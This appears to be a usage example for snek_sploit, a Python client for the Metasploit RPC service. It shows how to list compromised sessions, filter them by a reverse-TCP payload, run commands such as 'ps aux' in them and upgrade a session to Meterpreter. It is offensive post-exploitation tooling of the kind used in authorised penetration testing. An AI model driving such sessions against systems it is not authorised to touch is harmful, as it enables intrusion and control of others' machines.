from snek_sploit import MetasploitClient, SessionInformation


# Initialize MSF client
client = MetasploitClient("msf", "root", disable_https_warnings=True)

# Get session with a specific ID
my_session = client.sessions.get(1)

# Get all sessions
all_sessions = client.sessions.all()

# Get sessions that match the exact criteria
filtered_sessions = client.sessions.filter(SessionInformation(via_payload="python/shell_reverse_tcp"), True)

# Execute a command in the session (different behaviour for Shell and Meterpreter sessions), timeout after 10 seconds
# and return the gathered output
output = my_session.execute("ps aux", 10)
print(output)

# Execute a command, but always in the shell
output = my_session.execute_in_shell("ps", ["aux"], 10)
print(output)

# Upgrade the session to a Meterpreter session
my_session.upgrade_to_meterpreter("localhost", 6666)
